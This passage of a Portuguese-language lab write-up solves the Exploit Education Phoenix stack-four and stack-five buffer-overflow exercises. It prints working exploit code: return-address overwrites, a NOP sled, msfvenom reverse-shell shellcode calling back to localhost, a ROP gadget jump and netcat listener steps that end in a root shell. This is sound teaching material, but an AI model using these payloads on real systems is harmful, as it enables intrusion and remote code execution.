<pre><code class="language-x86asm">RAX (Valor retornado)
RDI (1Âº parÃ¢metro)
RSI (2Âº parÃ¢metro)
RDX (3Âº parÃ¢metro)
...
</code></pre>
<blockquote>
<p>Caso <strong>main()</strong> use um desses registers para armazenar dados para uso futuro, vai ser necessÃ¡rio dar um push neles, e restaura-los no epilogo</p>
</blockquote>
<a class="header" href="print.html#salvar-o-frame-atual" id="salvar-o-frame-atual"><h4>Salvar o frame atual</h4></a>
<pre><code class="language-x86asm">push RIP + 0x4 ; salva o RIP na stack, porÃ©m nÃ£o o valor atual,
           ; e sim o endereÃ§o da prÃ³xima instruÃ§Ã£o 
push RBP       ; salva o RBP
</code></pre>
<p>Atualmente, a stack estÃ¡ assim</p>
<pre><code class="language-x86asm">rbp main            &lt;- RSP   -
rip main                     | Frame de
....                         | main()
ret de main         &lt;- RBP   -
</code></pre>
<a class="header" href="print.html#criar-novo-frame" id="criar-novo-frame"><h4>Criar novo frame</h4></a>
<p>Agora, para criar um novo frame, precisamos subir o rbp atÃ© o rsp</p>
<pre><code class="language-x86asm">mov rbp rsp ; Move o valor de rsp para rbp!
            ; Ou melhor : rbp &quot;anda&quot; atÃ© o rsp
</code></pre>
<p>Atualmente, a stack estÃ¡ assim</p>
<pre><code class="language-x86asm">rbp main    &lt;- RSP  e RBP apontam para a mesma localizaÃ§Ã£o
rip main                   
... stack frame de main omitido           
</code></pre>
<p>Agora, precisamos <strong>subtrair</strong> de RSP para alocar espaÃ§o na memÃ³ria para essa funÃ§Ã£o</p>
<blockquote>
<p>A stack cresce para valores menores :)</p>
</blockquote>
<pre><code class="language-x86asm">sub rsp - 0x20 ; vamos supor que, para esse exemplo, a funÃ§Ã£o precisa de 32 bytes.
               ; Portanto, vamos subtrair 32 bytes de RSP, para faze-lo &quot;subir&quot;
</code></pre>
<p>Atualmente, a stack estÃ¡ assim</p>
<pre><code class="language-x86asm">...          &lt;- RSP      -
VariÃ¡veis de print_dois  |
...                      | Frame de
...                      | print_dois()
rbp main     &lt;- RBP      -
rip main                   
...              
</code></pre>
<p>Com esse mÃ©todo de chamar funÃ§Ã£o, nÃ£o importa a localizaÃ§Ã£o da memÃ³ria de quando a funÃ§Ã£o foi chamada, ela sempre vai executar da mesma maneira</p>
<blockquote>
<p>Esse processo pode ocorrer muitas vezes caso uma funÃ§Ã£o chame outra, no nosso exemplo, um novo frame seria criado para <strong>print()</strong>, print seria executada,
e o frame destruÃ­do ao retornar. Apos <strong>print()</strong> retornar, <strong>print_dois continuara a execuÃ§Ã£o normalmente! :)</strong></p>
</blockquote>
<pre><code class="language-x86asm">O prologo entÃ£o pode ser resumido em

salvar vars
call
  push rip
  push rbp
  mov rbp rsp
  sub rsp 0x1234
  executar a funÃ§Ã£o
</code></pre>
<a class="header" href="print.html#-epÃ­logo" id="-epÃ­logo"><h4>ğŸ”‘ EpÃ­logo</h4></a>
<p>O epilogo Ã© bem mais simples que o prologo:</p>
<pre><code>- Devolver memoria e restaurar RBP    -&gt; leave   
- Restaurar RIP  e retornar           -&gt; ret
</code></pre>
<p>Atualmente, a stack estÃ¡ assim</p>
<pre><code class="language-x86asm">...          &lt;- RSP      -
InstruÃ§Ãµes               |
...                      | Frame de
...                      | print_dois()
rbp main     &lt;- RBP      -
rip main                   
            
</code></pre>
<p><strong>leave</strong></p>
<p>Para devolver a memoria, precisamos mover RSP &quot;para baixo: basta dar um <code>mov rsp rbp</code> (&quot;andar&quot; rsp atÃ© o rbp)</p>
<p>Atualmente, a stack estÃ¡ assim</p>
<pre><code class="language-x86asm">...                    
VariÃ¡veis print dois   A regiÃ£o nÃ£o Ã© apagada, pois consumiria processamento a toa!
...         O valores ficam largados lÃ¡ atÃ© uma nova funÃ§Ã£o escrever por cima deles..
...         Por isso que, ao analisar a stack, as vezes vemos &quot;lixo&quot; aleatÃ³rio
...         Eles pode ser ignorado pois nem estÃ¡ mais na stack
                          
rbp main  &lt;- RBP e RSP - O topo da stack
rip main                                
</code></pre>
<p>Em seguida, vamos restaurar o rbp de main <code>pop rbp</code>
(remover o valor no topo da stack (ver acima por referencia), e coloca-lo no alvo: <strong>rbp</strong>)</p>
<pre><code class="language-x86asm">--- omitido ---
rip main      &lt;- RSP   (lembrando que RSP se ajusta automaticamente com push/pop)
...
... main
call print_dois
proxima instruÃ§Ã£o
... resto de main
ret de main   &lt;- RBP
</code></pre>
<p><strong>ret (return)</strong>
ret vai restaurar o EIP de main com um <code>pop rip</code></p>
<pre><code class="language-x86asm">...
...resto de main  &lt;- RSP
call print_dois
proxima instruÃ§Ã£o &lt;- RIP
... resto de main
ret da main       &lt;- RBP
</code></pre>
<p>Assim, o stack frame de main foi restaurado graÃ§as ao rbp e rip salvos ( o rip salvo Ã© chamado de <strong>Saved Return Pointer (SRP)</strong> )</p>
<a class="header" href="print.html#-caso-vocÃª-tenha-viajado-o-que-vocÃª-precisa-saber" id="-caso-vocÃª-tenha-viajado-o-que-vocÃª-precisa-saber"><h1>ğŸŒ Caso vocÃª tenha viajado, o que vocÃª precisa saber</h1></a>
<p>Existem algumas variÃ¡veis especiais dentro do processador:</p>
<pre><code class="language-x86asm">RSP Stack Pointer       -&gt; Aponta para o topo da stack
RBP Base Pointer        -&gt; Aponta para a base da stack
RIP Instruction Pointer -&gt; Aponta para a instruÃ§Ã£o que estÃ¡ sendo executada 
</code></pre>
<p>O RIP e o RBP atuais sÃ£o salvos na stack quando chamamos uma funÃ§Ã£o, junto das outras variÃ¡veis:</p>
<pre><code class="language-x86asm">buffer[64]
uns int qualquer usado na funÃ§Ã£o
....
rbp
rip
</code></pre>
<p>Se por um buffer overflow conseguimos alterar aqueles inteiros depois do buffer, como <code>changeme</code> nos exercÃ­cios anteriores, tambÃ©m conseguimos
alterar o RIP salvo (<code>SRP</code>) e redirecionar a execuÃ§Ã£o do programa!</p>
<a class="header" href="print.html#-exploit-1" id="-exploit-1"><h1>ğŸ”¥ Exploit</h1></a>
<a class="header" href="print.html#-analisar-o-programa" id="-analisar-o-programa"><h2>ğŸ”¬ Analisar o programa</h2></a>
<p>O programa contem 3 funÃ§Ãµes: <code>complete_level</code>, <code>start_level</code> e <code>main</code></p>
<p><code>main</code> printa a mensagem do comeÃ§o do nÃ­vel e chama start_level</p>
<p><code>complete_level</code> Ã© a funÃ§Ã£o que precisamos chamar</p>
<p><code>start_level</code> Ã© onde a magica acontece: <code>gets()</code> (vulnerÃ¡vel) Ã© chamada num <code>buffer[64]</code></p>
<a class="header" href="print.html#-o-compilador-adicionou-coisa" id="-o-compilador-adicionou-coisa"><h2>â‰ï¸ O compilador adicionou coisa???</h2></a>
<p>Se colocarmos somente um byte:</p>
<pre><code class="language-bash">$ ./stack-four 
Welcome to phoenix/stack-four, brought to you by https://exploit.education
A
and will be returning to 0x40068d
</code></pre>
<p>A funÃ§Ã£o normalmente retorna para 0x40068d !</p>
<pre><code class="language-bash">$ python -c &quot;print 'A'*80&quot; | ./stack-four 
Welcome to phoenix/stack-four, brought to you by https://exploit.education
and will be returning to 0x40068d
Segmentation fault
</code></pre>
<p>Nos colocamos mais de 64 bytes (80), e conseguimos dar overflow... mas o rip nÃ£o mudou e mesmo assim teve seg fault.... QUE?!!!!</p>
<p>O compilador muitas vezes coloca coisas na stack por performance ou compatibilidade!</p>
<p>Alem disso, nos exemplos passados o valor que queremo mudar estava logo depois do buffer, agora tem pelo menos o RBP salvo no meio do caminho!
EntÃ£o precisamos levar isso em consideraÃ§Ã£o, nÃ£o basta sÃ³ olhar que o tamanho do buffer Ã© 64 e colocar 64 bytes de <code>padding</code>!</p>
<p>Em aplicaÃ§Ãµes mais complexas, essa diferenÃ§a pode chegar a centenas de bytes.</p>
<p>Nos podemos encontrar essa diferenÃ§a usando ferramentas como fuzzers ou geradores de padrÃ£o...</p>
<p>Como nosso exemplo Ã© simples, podemos aumentar/diminuir manualmente ate encontrar o valor certo:</p>
<pre><code class="language-bash">$ python -c &quot;print 'A'*89&quot; | ./stack-four 
Welcome to phoenix/stack-four, brought to you by https://exploit.education
and will be returning to 0x41
Segmentation fault

$ python -c &quot;print 'A'*88&quot; | ./stack-four 
Welcome to phoenix/stack-four, brought to you by https://exploit.education
and will be returning to 0x400000
Segmentation fault
</code></pre>
<p>Isso quer dizer que apoÅ› <strong>88</strong> bytes, temos o SRP :D</p>
<a class="header" href="print.html#-encontrar-endereÃ§o-de-complete_level" id="-encontrar-endereÃ§o-de-complete_level"><h2>ğŸ  Encontrar endereÃ§o de complete_level</h2></a>
<p>VocÃª se lembra como faz? Nos usamos no exercÃ­cio passado....</p>
<blockquote>
<p>cof cof objdump -d cof cof</p>
</blockquote>
<pre><code>Se vc quer tentar sozinhx, agora Ã© a sua hora
.
.
.
.
.
.
.
.
.
.
.
.
.
Eai, conseguiu?
</code></pre>
<p>Encontrar endereÃ§o:</p>
<pre><code class="language-x86asm">$ objdump -d stack-four | grep complete_level
000000000040061d &lt;complete_level&gt;:
</code></pre>
<p>Exploit:</p>
<pre><code class="language-bash">$ python -c &quot;print 'A'*88 + '\x1d\x06\x40'&quot; | ./stack-four 
Welcome to phoenix/stack-four, brought to you by https://exploit.education
and will be returning to 0x40061d
Congratulations, you've finished phoenix/stack-four :-) Well done!
</code></pre>
<p>Esse foi um tutorial beeem longo, e com certeza o mais difÃ­cil! Se vocÃª chegou atÃ© aqui, parabÃ©ns! :D</p>
<a class="header" href="print.html#-soluÃ§Ã£o-4" id="-soluÃ§Ã£o-4"><h1>ğŸ’« SoluÃ§Ã£o</h1></a>
<pre><code class="language-bash">$ python -c &quot;print 'A'*88 + '\x1d\x06\x40'&quot; | ./stack-four 
Welcome to phoenix/stack-four, brought to you by https://exploit.education
and will be returning to 0x40061d
Congratulations, you've finished phoenix/stack-four :-) Well done!
</code></pre>
<ul>
<li><a href="print.html#-objetivo">ğŸ¯ Objetivo</a></li>
<li><a href="print.html#-dicas">ğŸ’¡ Dicas</a></li>
<li><a href="print.html#-exploit">ğŸ”¥ Exploit</a>
<ul>
<li><a href="print.html#analisando-o-programa">Analisando o programa</a></li>
<li><a href="print.html#agora-em-asm-d-analise-est%C3%A1tica">Agora em ASM :D (analise estÃ¡tica)</a>
<ul>
<li><a href="print.html#breakpoint">Breakpoint</a></li>
</ul>
</li>
<li><a href="print.html#agora-vamos-executar-o-programa-analise-din%C3%A2mica">Agora vamos executar o programa (analise dinÃ¢mica)</a></li>
<li><a href="print.html#encontrar-endere%C3%A7o-do-buffer">Encontrar endereÃ§o do buffer</a></li>
<li><a href="print.html#nop-sled">NOP sled</a></li>
<li><a href="print.html#shellcode">Shellcode</a></li>
<li><a href="print.html#corrigindo-o-problema">Corrigindo o problema</a>
<ul>
<li><a href="print.html#rop-gadgets">ROP Gadgets</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="print.html#-solu%C3%A7%C3%A3o">ğŸ’« SoluÃ§Ã£o</a></li>
</ul>
<a class="header" href="print.html#-objetivo-4" id="-objetivo-4"><h1>ğŸ¯ Objetivo</h1></a>
<p>Finalmente! Tudo isso para chegar no BOF SRP (clÃ¡ssico) :D</p>
<p>Agora ta na hora de redirecionar o pointer para o nosso cÃ³digo malicioso (shellcode) para ganhar uma shell</p>
<a class="header" href="print.html#-dicas-1" id="-dicas-1"><h1>ğŸ’¡ Dicas</h1></a>
<p>A instruÃ§Ã£o <code>0xCC</code> (<code>int3</code>) serve para no debugger (como o gdb), para quando o rip chegar nela, a execuÃ§Ã£o pausar (<code>breakpoint</code>). Nos podemos usa-la para testar se
sequer conseguimos executar cÃ³digo, ou se o problema ta no shellcode: Se o debugger avisa que teve <code>SIGTRAP</code>, nos temos execuÃ§Ã£o de cÃ³digo :D</p>
<p>Banco de dados de shellcode: <a href="http://shell-storm.org/shellcode/files/">shell-storm</a></p>
<a class="header" href="print.html#-exploit-2" id="-exploit-2"><h1>ğŸ”¥ Exploit</h1></a>
<a class="header" href="print.html#analisando-o-programa" id="analisando-o-programa"><h2>Analisando o programa</h2></a>
<p><code>main()</code> printa o banner e chama <code>start_level()</code></p>
<p><code>start_level()</code> cria um buffer[<strong>128</strong>] e salva o output de <code>gets()</code> (<strong>inseguro</strong>)</p>
<p>Como vocÃª pode ver, nÃ£o existe <code>complete_level()</code></p>
<p>Para completar, precisamos executar nosso prÃ³prio cÃ³digo (<code>shellcode</code>) e conseguir uma shell (uma linha de comando)</p>
<a class="header" href="print.html#agora-em-asm-d-analise-estÃ¡tica" id="agora-em-asm-d-analise-estÃ¡tica"><h2>Agora em ASM :D (analise estÃ¡tica)</h2></a>
<p>Normalmente, o gdb printa assim:</p>
<pre><code class="language-x86asm">   0x00000000004005a4 &lt;+0&gt;:	push   rbp
   0x00000000004005a5 &lt;+1&gt;:	mov    rbp,rsp
   0x00000000004005a8 &lt;+4&gt;:	sub    rsp,0x10
</code></pre>
<p>Porem, eu removi os endereÃ§os para simplificar, e sÃ³ mantive os importantes!</p>
<p>Primeiro, vamos ver main</p>
<pre><code class="language-x86asm">gef&gt; disassemble main
push   rbp
mov    rbp,rsp                    &lt;- Prologo
sub    rsp,0x10
   
   
mov    DWORD PTR [rbp-0x4],edi
mov    QWORD PTR [rbp-0x10],rsi   &lt;- args de puts
mov    edi,0x400620
call   0x400400 &lt;puts@plt&gt;        &lt;- call puts
   
   
mov    eax,0x0                    &lt;- args de start_level (nenhum)
call   0x40058d &lt;start_level&gt;     &lt;- call start_level
   
   
mov    eax,0x0                    &lt;- exit code (cÃ³digo de saida, 0=sem erro)
leave                             &lt;- Epilogo  
</code></pre>
<p>Agora vamos ver start_level</p>
<pre><code class="language-x86asm">gef&gt; disassemble start_level 
push   rbp
mov    rbp,rsp                  &lt;- Prologo 
add    rsp,0xffffffffffffff80   
                                
   
lea    rax,[rbp-0x80]         &lt;- rax = Pointer para buffer[128]
mov    rdi,rax                &lt;- rdi = rax

0x000000000040059c &lt;+15&gt;:
call   0x4003f0 &lt;gets@plt&gt;    &lt;- call gets


nop
leave                         &lt;- Epilogo
ret
</code></pre>
<p>Agora vamos adicionar um breakpoint!</p>
<a class="header" href="print.html#breakpoint" id="breakpoint"><h3>Breakpoint</h3></a>
<blockquote>
<p>Breakpoint = ponto de pausa</p>
</blockquote>
<p>Antes daquela intrusÃ£o ser executada, sera substituÃ­da por <code>0xCC</code>. Isso faz o  debugger pausar a execuÃ§Ã£o do programa naquela instruÃ§Ã£o!</p>
<p>Quando continuamos executando (normalmente o comando Ã© <strong>continue</strong>), o <code>0xCC</code> Ã© substituÃ­do pela instruÃ§Ã£o certa :D</p>
<p>Se vocÃª esta fora de um debugger, <code>0xCC</code> vai fazer o programa sair com erro</p>
<pre><code class="language-x86asm">gef&gt; b *0x000000000040059c
Breakpoint 1 at 0x40059c
</code></pre>
<p>&quot;b&quot; Ã© o comando do gdb para adicionar um breakpoint \
A &quot;*&quot; tem haver com aquele dos pointers \
O endereÃ§o Ã© para &quot;<code>call gets</code>&quot;</p>
<blockquote>
<p>Dica: se vocÃª selecionar/sublinhar (clique esquerdo e passa o mouse em cima, vocÃª sabe do que eu to falando), e clicar o botÃ£o do meio no mouse (a rodinha)
o terminal automaticamente da Ctrl-C Ctrl-V naquele valor para vocÃª! EntÃ£o nÃ£o precisa copiar o endereÃ§o manualmente :D</p>
</blockquote>
<a class="header" href="print.html#agora-vamos-executar-o-programa-analise-dinÃ¢mica" id="agora-vamos-executar-o-programa-analise-dinÃ¢mica"><h2>Agora vamos executar o programa (analise dinÃ¢mica)</h2></a>
<p>126 As nÃ£o causam erro, e 127 As causam... ue, mas pq? nÃ£o era pra dar erro sÃ³ em 128?</p>
<pre><code class="language-bash">$ python3 -c &quot;print('A'*126)&quot; | ./stack-five 
Welcome to phoenix/stack-five, brought to you by https://exploit.education

$ python3 -c &quot;print('A'*127)&quot; | ./stack-five 
Welcome to phoenix/stack-five, brought to you by https://exploit.education
Segmentation fault
</code></pre>
<p>Isso vai ser muito importante no prÃ³ximo desafio: buffers sÃ£o terminados com um null byte!</p>
<p>Por enquanto, isso sÃ³ nos mostra que o compilador nÃ£o adicionou nada no meio do caminho entre o buffer e o EBP+EIP Salvos :D</p>
<p>E nÃ³s ja sabemos como controlar o EIP, entÃ£o agora sÃ³ precisamos saber para onde redirecionar a execuÃ§Ã£o :)</p>
<a class="header" href="print.html#encontrar-endereÃ§o-do-buffer" id="encontrar-endereÃ§o-do-buffer"><h2>Encontrar endereÃ§o do buffer</h2></a>
<p>Agora dentro do gdb (<strong>gdb stack-five</strong>)</p>
<blockquote>
<p>gef&gt; r &lt;&lt;&lt; $(python3 -c &quot;print('A'<em>100)&quot;)</em>*7fff....</p>
</blockquote>
<p>stack
<img src="./img/stack_five/before_gets_2.png" alt="" /></p>
<p>VocÃª tambÃ©m acha que tem uma falta de AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA ?? hehehe :P</p>
<p>(((Insira aquele meme muito velho da cabra gritando)))</p>
<p>EntÃ£o vamos avanÃ§ar para prÃ³xima instruÃ§Ã£o (step: <code>s</code>) :D
<img src="./img/stack_five/gef_after_gets_0.png" alt="" /></p>
<p>Isso quer dizer que aquele pointer dos argumentos (RDI) agora aponta para os As! :D</p>
<pre><code class="language-x86asm">gef&gt; x/s 0x00007fffffffe5b0              -&gt; x/s Ã© o comando para printar strings
0x7fffffffe5b0:	'A' &lt;repete 140 vezes&gt;
</code></pre>
<p>EntÃ£o nos ja temos o endereÃ§o dos nossos As :D ... que em breve serÃ£o shellcode :D</p>
<p>Mas agora precisamos saber com precisÃ£o quantos As atÃ© o RIP, <code>info frame</code> vai nos ajudar com isso:</p>
<pre><code class="language-x86asm">gef&gt; info frame
Stack level 0, frame at 0x7fffffffe640:
 rip = 0x4005a1 in start_level  saved rip = 0x4005c7
 called by frame at 0x7fffffffe610
 Arglist at 0x7fffffffe630, args: 
 Locals at 0x7fffffffe630, Previous frame's sp is 0x7fffffffe640
 Saved registers:
  rbp at 0x7fffffffe630, rip at 0x7fffffffe638
</code></pre>
<p>A ultima linha Ã© a mais importante!</p>
<p>RIP em: <code>0x7fffffffe638</code></p>
<p>EntÃ£o para encontrar precisamente quantos As precisamos colocar atÃ© chegarmos no RIP,
basta subtrair <code>endereÃ§o do rip salvo - endereÃ§o dos As</code></p>
<pre><code class="language-x86asm">$ python3
&gt;&gt;&gt; 0x7fffffffe638 - 0x00007fffffffe5b0
136
</code></pre>
<p>Para confirmar isso, vamos rodar com 136 As + BBBB</p>
<p><img src="./img/stack_five/gef_136A_BBBB.png" alt="" /></p>
<p>RIP = BBBB (42424242) :D</p>
<a class="header" href="print.html#nop-sled" id="nop-sled"><h2>NOP sled</h2></a>
<p>Entretanto, como nada pode ser simples nesse mundo do desenvolvimento de exploits, nÃ³s nÃ£o conseguimos saber com precisÃ£o que o buffer vai estar naquela localizaÃ§Ã£o :(</p>
<p>Isso ocorre pois as envs sÃ£o alocadas na stack. E elas variam muito, por exemplo, sÃ³ de mudar o local de onde o programa esta sendo executado quebraria o nosso exploit.</p>
<blockquote>
<p>Dica: O gef pode nos ajudar a encontra-las
<img src="./img/stack_five/gef_envs_1.png" alt="" /></p>
</blockquote>
<p>Por exemplo:</p>
<p><img src="./img/stack_five/gef_envs_0.png" alt="" /></p>
<p>Para remediar isso, podemos usar um NOP sled (ou NOP slide) ! :D</p>
<p>(Outro mÃ©todo de remediaÃ§Ã£o Ã© mencionado em <code>stack-six</code>)</p>
<p>NOP significa &quot;<strong>No</strong> <strong>OP</strong>eration&quot; (<strong>N</strong>enhuma <strong>OP</strong>eraÃ§Ã£o) ! Ã© uma instruÃ§Ã£o que nÃ£o faz nada :D</p>
<p>A representaÃ§Ã£o em machine code do NOP Ã© <code>0x90</code> :D Bem fÃ¡cil de decorar, quem me dera escola fosse fÃ¡cil assim hehehe :)</p>
<p>O processador vai fazer nada e passar para a prÃ³xima, e se nÃ³s colocarmos vÃ¡rios desses em sequencia, o RIP vai &quot;deslizando&quot; atravÃ©s atÃ© chegar no nosso cÃ³digo!</p>
<p>VocÃª pode imaginar um escorregador :D yuuuuupiii</p>
<p><img src="./img/panda_slide_1.gif" alt="" /></p>
<p>EntÃ£o a gente redireciona o RIP para o meio do escorregador de NOPs, para ele deslizar atÃ© o nosso cÃ³digo :D</p>
<p>Assim, mesmo se o buffer estiverem em um endereÃ§o diferente, o RIP vai chegar no nosso shellcode</p>
<p>Para testar isso, vamos usar o truque do <code>0xCC</code> mencionado anteriormente</p>
<p>O input que vai passar vai conter:</p>
<pre><code class="language-x86asm">NOP * 135
0xCC
EndereÃ§o para ser colocado no RIP: 0x00007fffffffe5b0 + 70

70 = metade do escorregador (135)
</code></pre>
<p>E os <strong>breakpoints do gdb serÃ£o removidos</strong>, entÃ£o caso encontremos um breakpoint, foi o <code>0xCC</code> acima</p>
<pre><code class="language-x86asm">$ python3
&gt;&gt;&gt; hex(0x00007fffffffe5b0 + 70)
'0x7fffffffe5f6'                     - Little Endian -&gt; '\xb6\xe5\xff\xff\xff\x7f'
</code></pre>
<p>Agora executando:</p>
<pre><code class="language-x86asm">r &lt;&lt;&lt; $(python -c &quot;print '\x90' *135 + '\xcc' +'\xb6\xe5\xff\xff\xff\x7f'&quot;)
</code></pre>
<p>Nos recebemos uma SIGTRAP (chegou no breakpoint)</p>
<pre><code class="language-x86asm">[#0] Id 1, Name: &quot;stack-five&quot;, stopped, reason: SIGTRAP
</code></pre>
<p>E na seÃ§Ã£o <code>code</code> do gef
<img src="./img/stack_five/gef_run_xCC.png" alt="" />
Meio difÃ­cil de ver, mas tem:</p>
<pre><code class="language-x86asm">NOP
NOP
INT3
(bad)
(bad)
</code></pre>
<blockquote>
<p>int3 Ã© o nome de 0xCC, da mesma maneira que NOP Ã© o nome de 0x90</p>
</blockquote>
<p>Apos a nossa ultima instruÃ§Ã£o ha instruÃ§Ãµes invalidas <code>(bad)</code> que eram o nosso pointer, e logo em seguida o resto do programa normal! :D</p>
<a class="header" href="print.html#shellcode" id="shellcode"><h2>Shellcode</h2></a>
<p>Shellcode Ã© o cÃ³digo malicioso que vai ser executado ( normalmente te dando uma shell (terminal) nÃ£o autorizada )</p>
<p>Nos podemos usar os do link citado na dica, ou gerar uma usando <code>msfvenom</code> (ja vem instalado no kali linux)</p>
<blockquote>
<p>msfvenom -p linux/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 --platform linux -a x64 -f python --var-name buf</p>
</blockquote>
<pre><code>No encoder specified, outputting raw payload
Payload size: 74 bytes
Final size of python file: 373 bytes
buf =  b&quot;&quot;
buf += b&quot;\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48&quot;
buf += b&quot;\x97\x48\xb9\x02\x00\x11\x5c\x7f\x00\x00\x01\x51\x48&quot;
buf += b&quot;\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e&quot;
buf += b&quot;\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58&quot;
buf += b&quot;\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48&quot;
buf += b&quot;\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05&quot;

</code></pre>
<p>Agora, vamos fazer um exploit mais bem feito! <code>vim /tmp/gerar_exploit.py</code></p>
<pre><code class="language-python">buf =  b&quot;&quot;

# shellcode
buf += b&quot;\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48&quot;
buf += b&quot;\x97\x48\xb9\x02\x00\x11\x5c\x7f\x00\x00\x01\x51\x48&quot;
buf += b&quot;\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e&quot;
buf += b&quot;\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58&quot;
buf += b&quot;\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48&quot;
buf += b&quot;\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05&quot;

# NOP Sled para completar o resto do tamanho
buf = '\x90'*(136-len(buf)) + buf

# ret
buf += b'\xb6\xe5\xff\xff\xff\x7f' 


open(&quot;/tmp/exploit&quot;,&quot;wb&quot;).write(buf)
</code></pre>
<blockquote>
<p>O script /tmp/gerar_exploit.py vai gerar o que colocarÃ­amos no input, mas ao invÃ©s de printarmos para o terminal, vamos salvar em um arquivo binÃ¡rio (por isso o &quot;<code>wb</code>&quot; no <code>open</code>)!</p>
<p>Depois Ã© sÃ³ ler esse arquivo e redireciona-lo <code>cat /tmp/exploit | ./stack-five</code></p>
</blockquote>
<p>Porem, se tentamos executar esse exploit, recebemos <code>SIGSEV: violaÃ§Ã£o de segmento</code></p>
<a class="header" href="print.html#corrigindo-o-problema" id="corrigindo-o-problema"><h2>Corrigindo o problema</h2></a>
<p>Nessa eu empaquei, e a soluÃ§Ã£o veio daqui: <a href="https://blog.lamarranet.com/index.php/exploit-education-phoenix-stack-five-solution/">blog lamarranet</a></p>
<p>EntÃ£o valeu pela ajuda :D</p>
<p>Ao invÃ©s de colocar o endereÃ§o do buffer diretamente no RIP, vamos achar algo no programa original que aponte para ele: um <code>jmp esp</code> por exemplo</p>
<p>E o beneficio Ã© que, por estarmos pulando para uma parte estÃ¡tica, e usando-a para redirecionar para o buffer, nÃ£o corremos o risco do buffer mudar de endereÃ§o!</p>
<p>Isso quer dizer que nÃ£o precisamos mais do NOP slide :D</p>
<a class="header" href="print.html#rop-gadgets" id="rop-gadgets"><h3>ROP Gadgets</h3></a>
<p>Essa Ã© uma tÃ©cnica chamada programaÃ§Ã£o <code>ROP</code>, que sera discutida em tutoriais futuros :D  Mas o que vocÃª precisa saber por enquanto Ã© que cada um desses <code>jmps</code> Ã© chamado de <strong>gadget</strong></p>
<p>Gadgets sÃ£o instruÃ§Ãµes em outras partes do programa, que sÃ£o reaproveitadas por nos. Geralmente executar algo e pular para outro gadget!</p>
<p>Para achar esse jmp que nos ajudaria, podemos usar uma ferramenta chamada <code>ROPgadget</code></p>
<pre><code class="language-x86asm">$ ROPgadget --binary stack-five --only &quot;jmp&quot;
Gadgets information
============================================================
0x0000000000400481 : jmp rax

Unique gadgets found: 1
</code></pre>
<p>Isso quer dizer que, ao pular para <code>0x400481</code>, vamos executar <code>jmp rax</code> e acabar pulando para rax! e para onde rax aponta?</p>
<p>Colocando um break antes do ret de <code>start_level</code>, podemos ver que antes de retornar, rax aponta para o mesmo endereÃ§o que rsp, e convenientemente o inicio do nosso buffer
<img src="./img/stack_five/gef_rax.png" alt="" /></p>
<p>rax,rdi e rsp apontam para o inicio do buffer dos As</p>
<p>Assim, nÃ£o vamos mais precisar do NOP slide: temos um exploit que 100% dos casos vai apontar para o inicio do buffer!</p>
<p>SÃ³ precisamos colocar <code>padding</code> entre o shellcode e o RIP</p>
<p>EntÃ£o vamos modificar o exploit :D</p>
<pre><code>Dica: Shellcode+AAAAA+ret, Little Endian, 136 bytes ate RIP

Se vocÃª nÃ£o quiser ver a soluÃ§Ã£o enquanto tenta!
.
.
.
.
.
.
.
.
.
.
.
</code></pre>
<pre><code class="language-python">buf =  &quot;&quot;

# shellcode
buf += &quot;\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48&quot;
buf += &quot;\x97\x48\xb9\x02\x00\x11\x5c\x7f\x00\x00\x01\x51\x48&quot;
buf += &quot;\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e&quot;
buf += &quot;\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58&quot;
buf += &quot;\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48&quot;
buf += &quot;\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05&quot;

# Padding
buf += 'A' * (136 - len(buf))

# ret
buf += '\x81\x04\x40' # Aponta para jmp rax

open(&quot;/tmp/exploit&quot;,&quot;wb&quot;).write(buf)
</code></pre>
<blockquote>
<p>Eu removi o <strong>b&quot;&quot;</strong> pq tava dando problema :(</p>
</blockquote>
<p>Agora basta gerar o exploit: <code>python /tmp/gerar_exploit.py</code></p>
<p>Abrir um novo terminal: <code>ssh -p 2222 user@localhost</code></p>
<p>Terminal 1: <code>nc -lvnp 4444</code></p>
<p>Terminal 2: <code>cat /tmp/exploit | ./stack-five</code></p>
<p>Agora, no terminal 1 deve ter uma shell :D</p>
<p><img src="./img/stack_five/Exploit_working.png" alt="" /></p>
<blockquote>
<p>Dica: <code>bash -ip</code> vai deixar a sua shell mais usÃ¡vel</p>
</blockquote>
<p>Se nos tivÃ©ssemos executado o programa como root, a nossa shell teria esses privilÃ©gios elevados ! :D</p>
<p><img src="./img/stack_five/root_exploit.png" alt="" /></p>
<p><code>UID = 0</code> quer dizer que possuÃ­mos privilÃ©gios de root, mesmo que o <code>whoami</code> nÃ£o tenha dito root</p>
<p>E se o programa estivesse exposto para a rede, poderÃ­amos conseguir uma root shell remota :D (spoiler para os prÃ³ximos desafios hehehe)</p>
<hr />
<p>VocÃª chegou atÃ© aqui :D</p>
<p>Toma mais um gif de panda como presente</p>
<p><img src="./img/panda_slide_0.gif" alt="" /></p>
<a class="header" href="print.html#-soluÃ§Ã£o-5" id="-soluÃ§Ã£o-5"><h1>ğŸ’« SoluÃ§Ã£o</h1></a>
<blockquote>
<p>vim /tmp/gerar_exploit.py</p>
</blockquote>
<pre><code>buf =  &quot;&quot;

# shellcode
buf += &quot;\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48&quot;
buf += &quot;\x97\x48\xb9\x02\x00\x11\x5c\x7f\x00\x00\x01\x51\x48&quot;
